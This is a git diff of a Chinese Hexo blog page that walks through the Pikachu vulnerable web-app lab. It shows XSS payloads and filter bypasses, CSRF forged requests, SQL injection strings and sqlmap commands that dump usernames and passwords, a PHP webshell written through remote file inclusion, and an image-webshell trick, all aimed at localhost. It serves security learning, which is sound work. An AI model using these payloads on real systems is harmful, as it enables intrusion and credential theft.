@@ -29,7 +29,7 @@
 
     <script src="https://cdn.jsdelivr.net/gh/anwar211/anwar211.github.io/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 5.3.0">
+<meta name="generator" content="Hexo 5.4.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 </head>
 
@@ -496,12 +496,14 @@
    <span class="token punctuation">}</span>
 <span class="token comment">//试试：'&gt;&lt;img src="#" onmouseover="alert('xss')"&gt;</span>
 <span class="token comment">//试试：' onclick="alert('xss')"&gt;,闭合掉就行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>我们输入的str被domxss这个函数执行，getElementById 获取到了标签 id 为 text 的内容赋值给str，然后又把 str 的内容通过字符串拼接的方式写到了 a 标签的 href 属性中，a标签会写到 id 为 dom的 div 标签中。</p>
 <p>源码给了我们提示，只需要闭合前面的，我们后面的就能正常执行了</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">payload1：
 <span class="token string">'&gt;&lt;img src="#" onmouseover="alert('</span>hello'<span class="token punctuation">)</span>"<span class="token operator">&gt;</span>
 payload2<span class="token operator">:</span>
 <span class="token string">' onclick="alert('</span>hello'<span class="token punctuation">)</span>"<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h3 id="DOM型xss-x"><a href="#DOM型xss-x" class="headerlink" title="DOM型xss-x"></a>DOM型xss-x</h3><p>同样的审查源码</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">domxss</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> str <span class="token operator">=</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>search<span class="token punctuation">;</span>
@@ -512,6 +514,7 @@ payload2<span class="token operator">:</span>
                     <span class="token punctuation">}</span>
 <span class="token comment">//试试：'&gt;&lt;img src="#" onmouseover="alert('xss')"&gt;</span>
 <span class="token comment">//试试：' onclick="alert('xss')"&gt;,闭合掉就行     </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>payload和上面一样，把构造闭合语句就行</p>
 <p>与前面的不同它是从浏览器URL中获取输入的。 <code>window.location.search</code> 获取URL的内容，再赋值给 str ，经过URL解码和字符串分隔，取出URL中的参数内容，再把 +替换为空格，赋值给 xss，最后把 xss 拼接到 a 标签中，然后写到 id 为 dom 的 div 标签中</p>
 <h3 id="xss之盲打"><a href="#xss之盲打" class="headerlink" title="xss之盲打"></a>xss之盲打</h3><blockquote>
@@ -535,6 +538,7 @@ payload2<span class="token operator">:</span>
 <p>有可能是过滤掉了script中间的内容</p>
 <p>想到php的过滤，先试试混个大小写能不能绕过</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>SCRiPT<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"人生苦短"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>SCRIpT<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>果然可以</p>
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210209210646835.png"></p>
 <p>百度一下xss绕过姿势，发现还有许多的方法可以绕过过滤</p>
@@ -544,23 +548,28 @@ payload2<span class="token operator">:</span>
 &lt;img src=x onerror="window.alert(AAAAA)"&gt;&lt;/img&gt;
 &lt;img src=x onerror="top['al'+'ert'](AAAAA)"&gt;&lt;/img&gt;
 &lt;img src=x onerror="top.alert(AAAAA)"&gt;&lt;/img&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h3 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h3><blockquote>
 <p>htmlspecialchars — 将特殊字符转换为 HTML 实体</p>
 <p>预定义的字符是<br>&amp; 成为 &amp;amp<br>“ 成为 &amp;quot<br>‘ 成为 &amp;#039<br>&lt; 成为 &amp;lt<br>可用引号类型<br>ENT_COMPAT：默认，仅编码双引号<br>ENT_QUOTES：编码双引号和单引号<br>ENT_NOQUOTES：不编码任何引号</p>
 </blockquote>
 <pre class="line-numbers language-none"><code class="language-none">输几个预定义字符看看
 '"&lt;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210211085207658.png"></p>
 <p>把href拼接掉弹个框试试</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">#<span class="token string">' onclick=alert('</span>冲冲冲<span class="token string">') '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>在源码可以看到，闭合了href同时点击事件也被加了进去</p>
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210211090013242.png"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210211085847943.png"></p>
 <h3 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h3><p>这题有点懵，看了下源码</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$message</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">ENT_QUOTES</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token variable">$html</span><span class="token operator">.=</span>"<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string single-quoted-string">'{$message}'</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>查了一下，发现可以用javascript协议来执行js</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"这样子啊"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210211091239215.png"></p>
 <p><strong>防御措施：</strong></p>
 <ul>
@@ -580,8 +589,10 @@ payload2<span class="token operator">:</span>
 
     <span class="token punctuation">}</span>
 <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>get传参给$ms再进行判断，既然是在一个script标签中，可以在传入参数的时候把前一个script标签给它拼接好</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">'&lt;/script&gt;&lt;script&gt;alert('</span>Hello<span class="token operator">!</span>'<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h3 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h3><ul>
 <li><strong>长度限制</strong></li>
 <li><strong>加验证码</strong></li>
@@ -602,6 +613,7 @@ payload2<span class="token operator">:</span>
 <p>修改提交的时候抓包</p>
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210211094138876.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">http://127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&amp;phonenum=111111&amp;add=CHINA&amp;email=lucy%40qq.com&amp;submit=submit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>修URL然后发给别人，只要他在登录状态下点了这个链接，他的信息就被修改了</p>
 <h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>还是一样登录，修改信息，抓包。但这次修改信息是在一个POST表单里,不能直接改URL了</p>
 <p>查了一下发现一般可以自己搭一个站点，然后将POST请求隐藏在站点的表单里，当用户点击后数据就被POST到有CSRF漏洞的网站</p>
@@ -640,6 +652,7 @@ document<span class="token punctuation">.</span><span class="token function">get
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
  
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>这个构造的网页也可以用CSRFTester抓包来生成</p>
 <p>把这个存为一个html文件，放到网站目录下，如果有人在登录状态下点进了这个网页并提交了，他的信息就会被改成我们事先准备好的</p>
 <h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF(Token)"></a>CSRF(Token)</h3><p>抓包的时候发现和前面的比较，多了一个令牌。每次请求时都增加一个不容易伪造的随机字符串，后台再对令牌进行校验</p>
@@ -661,6 +674,7 @@ id<span class="token operator">=</span><span class="token operator">-</span><spa
 id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#爆表</span>
 id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token comment">#爆字段</span>
 id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token string">':'</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token comment">#爆值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214160143419.png"></p>
 <h3 id="字符型注入（get）"><a href="#字符型注入（get）" class="headerlink" title="字符型注入（get）"></a>字符型注入（get）</h3><p>常规套路</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#1.判断注入类型</span>
@@ -684,6 +698,7 @@ id<span class="token operator">=</span><span class="token operator">-</span><spa
 
 <span class="token comment">#7.爆值</span>
 <span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,concat_ws('</span><span class="token operator">-</span>'<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214180536040.png"></p>
 <h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><blockquote>
 <p>到这里变量类型拼接类型多种多样，只要成功把闭合构造出来就行</p>
@@ -691,18 +706,23 @@ id<span class="token operator">=</span><span class="token operator">-</span><spa
 <p>第一次遇到搜索型注入</p>
 <p>语句格式</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">like</span> <span class="token string">'%{$username}%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>构造合法语句</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xxx<span class="token operator">%</span>' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214183952763.png"></p>
 <h3 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h3><p>查看源码</p>
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214184354419.png"></p>
 <p>payload</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">xx'<span class="token punctuation">)</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span> <span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h3 id="“insert-update”注入"><a href="#“insert-update”注入" class="headerlink" title="“insert/update”注入"></a>“insert/update”注入</h3><p>进入注册页面，推测在用户名或者密码那可能存在注入漏洞</p>
 <p>随便输入看看报错</p>
 <pre class="line-numbers language-none"><code class="language-none">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'),'','','','')' at line 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>试了几种常见的，发现报错注入可以</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">Amy<span class="token string">' and updatexml(1,concat(0x7e,database()),0) or '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214185323297.png"></p>
 <h3 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h3><p>随便放点留言进去，根据题意</p>
 <p>点删除的时候抓包</p>
@@ -717,21 +737,26 @@ id<span class="token operator">=</span><span class="token operator">-</span><spa
 你的http accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
 
 你的端口（本次连接）:tcp2211<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>似曾相识啊</p>
 <p>这个和sqli-labs后面那几个独特的注入点差不多</p>
 <p>试了下<strong>User-Agent、Accept、Cookie</strong>都可以注入</p>
 <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">' and extractvalue(1,concat(0x7e,database())) and '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h3 id="盲注-base-on-boolean"><a href="#盲注-base-on-boolean" class="headerlink" title="盲注(base on boolean)"></a>盲注(base on boolean)</h3><blockquote>
 <p>布尔盲注和时间盲注只能一个一个去猜，在不知道数据库信息的情况下手工去做非常的浪费时间</p>
 <p>这里可以直接用sqlmap或者写点py脚本来做</p>
 </blockquote>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2"</span> -D pikachu -T <span class="token function">users</span> -C username,password --dump --batch --threads <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214195143311.png"></p>
 <h3 id="盲注-base-on-time"><a href="#盲注-base-on-time" class="headerlink" title="盲注(base on time)"></a>盲注(base on time)</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#时间盲注</span>
 kobe<span class="token string">' and if((substr(database(),1,1))='</span>p'<span class="token punctuation">,</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214192508708.png"></p>
 <p>直接上sqlmap</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python sqlmap.py -u <span class="token string">"http://127.0.0.1/pikachu/vul/sqli/sqli_blind_t.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2#"</span> --technique T -D pikachu -T <span class="token function">users</span> -C username,password --dump --batch --threads <span class="token number">10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>有点小慢，正在一个一个字符的试</p>
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214195819281.png"></p>
 <h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><blockquote>
@@ -774,6 +799,7 @@ kobe<span class="token string">' and if((substr(database(),1,1))='</span>p'<span
 
 <span class="token comment">#查询字段信息 </span>
 <span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>df' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214201047814.png"></p>
 <h2 id="REC（远程代码执行）"><a href="#REC（远程代码执行）" class="headerlink" title="REC（远程代码执行）"></a>REC（远程代码执行）</h2><blockquote>
 <p><strong>远程系统命令执行</strong><br>一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。                        而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器                        </p>
@@ -812,16 +838,19 @@ kobe<span class="token string">' and if((substr(database(),1,1))='</span>p'<span
     <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token keyword">include</span> <span class="token string double-quoted-string">"include/<span class="token interpolation"><span class="token variable">$filename</span></span>"</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><strong>这里可以进行目录穿越，读取本机文件</strong></p>
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214202652400.png"></p>
 <h3 id="Remote"><a href="#Remote" class="headerlink" title="Remote"></a>Remote</h3><p><strong>前提</strong></p>
 <pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token constant">allow_url_fopen</span><span class="token attr-value"><span class="token punctuation">=</span>on //默认打开</span>
 <span class="token constant">allow_url_include</span><span class="token attr-value"><span class="token punctuation">=</span>on //默认关闭</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p><strong>源码</strong></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
     <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token keyword">include</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$filename</span></span>"</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><strong>这里只能读取txt文件，这里把txt解析成php执行</strong></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"yijuhua.php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -829,8 +858,10 @@ kobe<span class="token string">' and if((substr(database(),1,1))='</span>p'<span
 <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <pre class="line-numbers language-none"><code class="language-none">?filename=http://127.0.0.1/pikachu/test/yijuhua.txt
 访问它，执行php函数，生成一个php木马再连上去<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 
 
 <h2 id="Unsafe-FileDownload（不安全文件下载）"><a href="#Unsafe-FileDownload（不安全文件下载）" class="headerlink" title="Unsafe FileDownload（不安全文件下载）"></a>Unsafe FileDownload（不安全文件下载）</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><blockquote>
@@ -855,6 +886,7 @@ kobe<span class="token string">' and if((substr(database(),1,1))='</span>p'<span
 <p>做图片马就行</p>
 <p><strong>1.copy命令</strong></p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">copy <span class="token number">1</span>.jpg/b + <span class="token number">1</span>.php/a <span class="token number">2</span>.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p><strong>2.二进制编辑器</strong></p>
 <p>在后面加上木马就行</p>
 <p><strong>3.PS插入</strong></p>
@@ -880,6 +912,7 @@ kobe<span class="token string">' and if((substr(database(),1,1))='</span>p'<span
     <span class="token variable">$username</span><span class="token operator">=</span><span class="token function">escape</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token variable">$query</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from member where username='<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span>
     <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><blockquote>
 <p><strong>A用户权限高于B用户，B用户越权操作A用户的权限的情况称为垂直越权。</strong></p>
 </blockquote>
@@ -912,6 +945,7 @@ kobe<span class="token string">' and if((substr(database(),1,1))='</span>p'<span
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
+
 <h2 id="（目录遍历）"><a href="#（目录遍历）" class="headerlink" title="../../../（目录遍历）"></a>../../../（目录遍历）</h2><blockquote>
 <p>在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。  在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“../”这样的手段让后台打开或者执行一些其他的文件。  从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。</p>
 <p>看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。</p>
@@ -928,6 +962,7 @@ kobe<span class="token string">' and if((substr(database(),1,1))='</span>p'<span
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 
+
 <h2 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h2><blockquote>
 <p>由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：<br>—通过访问url下的目录，可以直接列出目录下的文件列表;<br>—输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;<br>—前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;</p>
 </blockquote>
@@ -940,6 +975,7 @@ kobe<span class="token string">' and if((substr(database(),1,1))='</span>p'<span
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token argument-name">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"S"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span><span class="token argument-name">s</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"&lt;script&gt;alert('AAA')&lt;/script&gt;"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
+
 <h2 id="XXE（XML外部实体注入攻击）"><a href="#XXE（XML外部实体注入攻击）" class="headerlink" title="XXE（XML外部实体注入攻击）"></a>XXE（XML外部实体注入攻击）</h2><blockquote>
 <p>XXE -“xml external entity injection” 即”xml外部实体注入漏洞”。<br>概括一下就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”<br>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。<br>现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。<br>以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。</p>
 </blockquote>
@@ -948,6 +984,7 @@ kobe<span class="token string">' and if((substr(database(),1,1))='</span>p'<span
 XML 被设计用来传输和存储数据，其焦点是数据的内容。
 HTML 被设计用来显示数据，其焦点是数据的外观。
 HTML 旨在显示信息，而 XML 旨在传输信息。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><strong>XML大致语法：</strong></p>
 <pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">第一部分：XML声明部分
 <span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
@@ -966,6 +1003,7 @@ HTML 旨在显示信息，而 XML 旨在传输信息。<span aria-hidden="true" 
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>
